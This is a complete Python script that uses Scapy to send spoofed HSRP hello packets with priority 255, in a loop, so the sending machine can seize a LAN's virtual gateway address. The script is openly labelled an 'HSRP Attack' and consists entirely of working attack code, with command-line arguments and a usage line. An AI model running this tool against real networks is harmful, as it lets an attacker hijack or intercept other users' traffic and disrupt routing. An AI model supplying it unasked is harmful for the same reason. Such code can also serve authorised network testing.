from scapy.all import *
from argparse import ArgumentParser

# Defining the arguments
parser=ArgumentParser()
parser.add_argument('--src','-src', help='Source IP Address')
parser.add_argument('--group','-grp', help='HSRP Group No.')
parser.add_argument('--virtualIP','-vip', help='Virtual IP Address')
parser.add_argument('--iface','-int', help='Interface')
parser.epilog="Usage: sudo python3 hsrp.py -src 10.0.0.10 -grp 1 -vip 10.0.0.1 -int eth0"

args=parser.parse_args()

# Check the validity of arguments
if args.src is not None and args.group is not None and args.virtualIP is not None and args.iface is not None:
   ip = IP(src=args.src, dst='224.0.0.2')       # Modifies the IP header, with destination to the well-known HSRP IP address
   udp = UDP(sport=1985,dport=1985)             # Modifies the UDP port to HSRP's port
   hsrp = HSRP(group=int(args.group),priority=255,virtualIP=args.virtualIP)   # Modifies a HSRP header according to specified arguments
      
   print("HSRP Attack is in progress, do CTRL+C to cancel / exit")
   send(ip/udp/hsrp, iface=args.iface, inter=3, loop=1)  # Send the packet with all the modified headers, and loop.

   sys.exit(0) 
   
else:
   parser.print_help()
   sys.exit(1)

